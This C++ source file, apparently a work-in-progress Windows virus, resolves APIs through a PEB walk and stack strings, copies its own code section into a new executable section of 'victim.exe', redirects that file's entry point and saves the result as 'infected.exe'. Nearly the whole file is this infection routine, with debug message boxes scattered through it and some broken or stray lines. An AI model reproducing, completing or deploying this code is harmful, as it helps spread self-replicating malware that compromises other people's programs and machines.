#include <windows.h>
#include <vector>


#pragma pack(push, 1)
#include <Windows.h>
#include "peb-lookup.h"


// Strings almacenados en la sección .text
#pragma code_seg(".text")




__declspec(allocate(".text"))
wchar_t kernel32_str[] = L"kernel32.dll";

__declspec(allocate(".text"))

#ifndef CUSTOM_ALIGN_UP
#define CUSTOM_ALIGN_UP(value, alignment) (((value) + ((alignment) - 1)) & ~((alignment) - 1))
#endif
char load_lib_str[] = "LoadLibraryA";


// Stack based strings for libraries and functions the shellcode needs
wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
char kr32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
char ucrtbase_dll_name[] = { 'u','c','r','t','b','a','s','e','.','d','l','l' };
char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
char cf_name[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
char rf_name[] = { 'R','e','a','d','F','i','l','e', 0 };
char close_handle_name[] = { 'C','l','o','s','e','H','a','n','d','l','e', 0 };
char mb_to_wc_name[] = { 'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r', 0 };
char strncmp_name[] = { 's','t','r','n','c','m','p', 0 };
char get_file_size_name[] = { 'G','e','t','F','i','l','e','S','i','z','e', 0 };
char map_view_of_file_name[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char unmap_view_of_file_name[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char create_file_mapping_name[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
// stack based strings to be passed to the messagebox win api
wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
wchar_t msg_title[] = { 'D','e','m','o','!', 0 };
char  fileName[] = { 'c', '-', 's','h','e','l','l','c','o','d','e','.','e','x','e', 0 };
char  fileName_vic[] = { 'y', 'u', 's','k','o','v','i','c','.','e','x','e', 0 };
// Nombre de la función
char func_name[] = { 's','t','r','n','c','m','p',0 };
// Read the file
const DWORD bufferSize = 64;
char buffer[bufferSize] = { 0 };
DWORD bytesRead;
wchar_t wide_buffer[bufferSize]; // Crear un buffer Unicode
// Definición del nombre de la función malloc
char malloc_name[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
// Definición del nombre de la función memcpy
char memcpy_name[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };

// Declarar las funciones globales
HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
FARPROC(WINAPI* _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
DWORD(WINAPI* _GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
LPVOID(WINAPI* _MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
BOOL(WINAPI* _UnmapViewOfFile)(LPCVOID lpBaseAddress);
HANDLE(WINAPI* _CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
int(WINAPI* _MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
int(WINAPI* _MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
int(WINAPI* _strncmp)(const char* str1, const char* str2, size_t num);
errno_t(CDECL* _strcpy_s)(char* dest, size_t destsz, const char* src);
void(WINAPI* _ZeroMemory)(PVOID ptr, SIZE_T size);
DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
BOOL(WINAPI* _SetEndOfFile)(HANDLE hFile);
void* (WINAPI* _malloc)(size_t size);
void* (WINAPI* _memcpy)(void* dest, const void* src, size_t n);
HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL(WINAPI* _WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
void* (WINAPI* _memset)(void* dest, int value, size_t num);
BOOL(WINAPI* _FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
LPVOID(WINAPI* _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL(WINAPI* _VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
VOID(WINAPI* _ExitProcess)(UINT uExitCode);
int(__cdecl* _strcmp)(const char* str1, const char* str2);
errno_t(__cdecl* _strncpy_s)(char* dest, size_t destSize, const char* src, size_t count);
void(WINAPI* _CopyMemory)(PVOID dest, const VOID* src, SIZE_T count);

// Función para inicializar las funciones globales
bool InitializeFunctions() {
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) return false;

    _LoadLibraryA = (HMODULE(WINAPI*)(LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    _GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!_LoadLibraryA || !_GetProcAddress) return false;

    HMODULE k32_dll = _LoadLibraryA(kr32_dll_name);
    HMODULE u32_dll = _LoadLibraryA(user32_dll_name);
    HMODULE hLibC = _LoadLibraryA(ucrtbase_dll_name);
    HMODULE hMsvcrt = _LoadLibraryA("msvcrt.dll");
    if (!k32_dll || !u32_dll || !hLibC) return false;
    _CreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) _GetProcAddress(k32_dll, "CreateFileA");
    _GetFileSize = (DWORD(WINAPI*)(HANDLE, LPDWORD)) _GetProcAddress(k32_dll, get_file_size_name);
    _MapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T)) _GetProcAddress(k32_dll, map_view_of_file_name);
    _UnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID)) _GetProcAddress(k32_dll, unmap_view_of_file_name);
    _CreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)) _GetProcAddress(k32_dll, create_file_mapping_name);
    _ReadFile = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, rf_name);
    _MessageBoxW = (int(WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT)) _GetProcAddress(u32_dll, message_box_name);
    _MultiByteToWideChar = (int(WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int)) _GetProcAddress(k32_dll, mb_to_wc_name);
    _CloseHandle = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, close_handle_name);
    _strncmp = (int(WINAPI*)(const char*, const char*, size_t)) _GetProcAddress(hLibC, strncmp_name);
    _strcpy_s = (errno_t(CDECL*)(char*, size_t, const char*)) _GetProcAddress(hLibC, "strcpy_s");
    _ZeroMemory = (void(WINAPI*)(PVOID, SIZE_T)) _GetProcAddress(k32_dll, "ZeroMemory");

    _SetFilePointer = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD)) _GetProcAddress(k32_dll, "SetFilePointer");
    _SetEndOfFile = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, "SetEndOfFile");
    _malloc = (void* (WINAPI*)(size_t)) _GetProcAddress(hLibC, malloc_name);
    _memcpy = (void* (WINAPI*)(void*, const void*, size_t)) _GetProcAddress(hLibC, memcpy_name);

    // Inicializar WriteFile, FlushViewOfFile y memset
    _WriteFile = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, "WriteFile");
    _FlushViewOfFile = (BOOL(WINAPI*)(LPCVOID, SIZE_T)) _GetProcAddress(k32_dll, "FlushViewOfFile");
    _memset = (void* (WINAPI*)(void*, int, size_t))_GetProcAddress(hLibC, "memset");
    _VirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD)) _GetProcAddress(k32_dll, "VirtualAlloc");
    _VirtualFree = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD)) _GetProcAddress(k32_dll, "VirtualFree");
    _ExitProcess = (VOID(WINAPI*)(UINT))_GetProcAddress(k32_dll, "ExitProcess");
    _CopyMemory = (void(WINAPI*)(PVOID, const VOID*, SIZE_T))_GetProcAddress(k32_dll, "RtlCopyMemory");
    _strcmp = (int(__cdecl*)(const char*, const char*))_GetProcAddress(hMsvcrt, "strcmp");
    _strncpy_s = (errno_t(__cdecl*)(char*, size_t, const char*, size_t))_GetProcAddress(hMsvcrt, "strncpy_s");

    return _GetFileSize && _MapViewOfFile && _UnmapViewOfFile && _CreateFileMappingA && _ReadFile && _MessageBoxW &&
        _MultiByteToWideChar && _CloseHandle && _strncmp && _strcpy_s && _ZeroMemory && _SetFilePointer &&
        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset && _VirtualAlloc && _VirtualFree && _ExitProcess && _CopyMemory && _strcmp && _strncpy_s;
}

void PrintError(const char* message) {
    wchar_t wbuffer[64];
    _MultiByteToWideChar(CP_ACP, 0, message, -1, wbuffer, 64);
    _MessageBoxW(NULL, wbuffer, L"Error", MB_ICONERROR);
    _ExitProcess(EXIT_FAILURE);
}

DWORD GetTextSectionRVA(const char* filePath, DWORD& textSectionSize) {
    _MessageBoxW(NULL, L"_CreateFileA", L"Error", MB_OK);
    HANDLE hFile = _CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("Cannot open file");
    }
    _MessageBoxW(NULL, L"_GetFileSize", L"Error", MB_OK);
    DWORD fileSize = _GetFileSize(hFile, NULL);
    char* fileData = (char*)_VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead;
    _MessageBoxW(NULL, L"_ReadFile", L"Error", MB_OK);
    if (!_ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
        PrintError("Error reading file");
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;
    IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)(fileData + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(fileData + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
    _MessageBoxW(NULL, L"NumberOfSections", L"Error", MB_OK);
    DWORD rva = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (_strcmp((char*)sections[i].Name, ".text") == 0) {
            textSectionSize = sections[i].Misc.VirtualSize;
            rva = sections[i].PointerToRawData;
            break;
        }
    }
    _MessageBoxW(NULL, L"_VirtualFree", L"Error", MB_OK);
    _VirtualFree(fileData, 0, MEM_RELEASE);
    _MessageBoxW(NULL, L"_CloseHandle", L"Error", MB_OK);
    _CloseHandle(hFile);
    return rva;
}

void InjectSelf(const char* victimFilePath, const char* outputFilePath, const char* selfCode, size_t selfCodeSize) {
    _MessageBoxW(NULL, L"_CreateFileA", L"Error", MB_OK);
    HANDLE hFile = _CreateFileA(victimFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("Cannot open victim file");
    }
    _MessageBoxW(NULL, L"_GetFileSize", L"Error", MB_OK);
    DWORD fileSize = _GetFileSize(hFile, NULL);
    _MessageBoxW(NULL, L"_VirtualAlloc", L"Error", MB_OK);
    char* fileData = (char*)_VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead;
    _MessageBoxW(NULL, L"_ReadFile", L"Error", MB_OK);
    if (!_ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
        PrintError("Error reading PE file");
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;
    IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)(fileData + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(fileData + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    IMAGE_FILE_HEADER& fileHeader = ntHeaders->FileHeader;
    IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders->OptionalHeader;

    IMAGE_SECTION_HEADER& lastSection = sections[fileHeader.NumberOfSections - 1];
    DWORD newSectionVirtualAddress = lastSection.VirtualAddress + ((lastSection.Misc.VirtualSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1));
    DWORD newSectionPointerToRawData = lastSection.PointerToRawData + ((lastSection.SizeOfRawData + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));

    size_t newFileSize = newSectionPointerToRawData + ((selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));
    _MessageBoxW(NULL,L"_VirtualAlloc", L"Error", MB_OK);
    fileData = (char*)_VirtualAlloc(fileData, newFileSize, MEM_COMMIT, PAGE_READWRITE);

    IMAGE_SECTION_HEADER newSection = {};
    _strncpy_s((char*)newSection.Name, sizeof(newSection.Name), ".self", _TRUNCATE);
    newSection.Misc.VirtualSize = (selfCodeSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1);
    newSection.VirtualAddress = newSectionVirtualAddress;
    newSection.SizeOfRawData = (selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    newSection.PointerToRawData = newSectionPointerToRawData;
    newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    _CopyMemory(fileData + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections, &newSection, sizeof(newSection));
    fileHeader.NumberOfSections++;
    optionalHeader.SizeOfImage = newSection.VirtualAddress + newSection.Misc.VirtualSize;

    DWORD sizeOfHeaders = dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections;
    sizeOfHeaders = (sizeOfHeaders + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    optionalHeader.SizeOfHeaders = sizeOfHeaders;

    _CopyMemory((PVOID)(fileData + newSection.PointerToRawData), (PVOID)selfCode, selfCodeSize);

    optionalHeader.AddressOfEntryPoint = newSection.VirtualAddress;

    _CopyMemory(fileData + dosHeader->e_lfanew, ntHeaders, sizeof(IMAGE_NT_HEADERS64));
    _CopyMemory(fileData, dosHeader, sizeof(IMAGE_DOS_HEADER));
    _MessageBoxW(NULL, L"_CreateFileA(outputFilePath)", L"Error", MB_OK);
    HANDLE hOutFile = _CreateFileA(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutFile == INVALID_HANDLE_VALUE) {
        PrintError("Cannot open output file");
    }

    DWORD bytesWritten;
    _WriteFile(hOutFile, fileData, newFileSize, &bytesWritten, NULL);

    _VirtualFree(fileData, 0, MEM_RELEASE);
    _CloseHandle(hFile);
    _CloseHandle(hOutFile);
    // std::cout << "Self-code injected and entry point modified successfully." << std::endl;
}

int main(int argc, char* argv[]) {
   
    InitializeFunctions();
    _MessageBoxW(NULL, L"ALL", L"Error", MB_OK);
    const char* victimFilePath = "victim.exe"; // Cambiar por el archivo de víctima
    const char* outputFilePath = "infected.exe"; // Cambiar por el archivo de salida

    char selfPath[MAX_PATH];
    //_GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    DWORD textSectionSize = 0;
    _MessageBoxW(NULL, L"GetTextSectionRVA", L"Error", MB_OK);
    DWORD textSectionOffset = GetTextSectionRVA(selfPath, textSectionSize);
    _MessageBoxW(NULL, L"_CreateFileA", L"Error", MB_OK);
    HANDLE hSelfFile = _CreateFileA(selfPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSelfFile == INVALID_HANDLE_VALUE) {
        PrintError("Cannot open self file");
    }
    _MessageBoxW(NULL, L"_VirtualAlloc", L"Error", MB_OK);
    char* selfCode = (char*)_VirtualAlloc(NULL, textSectionSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead;
    _MessageBoxW(NULL, L"_SetFilePointer", L"Error", MB_OK);
    _SetFilePointer(hSelfFile, textSectionOffset, NULL, FILE_BEGIN);
    _MessageBoxW(NULL, L"_ReadFile", L"Error", MB_OK);
    if (!_ReadFile(hSelfFile, selfCode, textSectionSize, &bytesRead, NULL)) {
        PrintError("Error reading self code");
    }
    _MessageBoxW(NULL, L"InjectSelf", L"Error", MB_OK);
    InjectSelf(victimFilePath, outputFilePath, selfCode, textSectionSize);
    _MessageBoxW(NULL, L"_VirtualFree", L"Error", MB_OK);
    _VirtualFree(selfCode, 0, MEM_RELEASE);
    _MessageBoxW(NULL, L"_CloseHandle", L"Error", MB_OK);
    _CloseHandle(hSelfFile);

    return 0;
}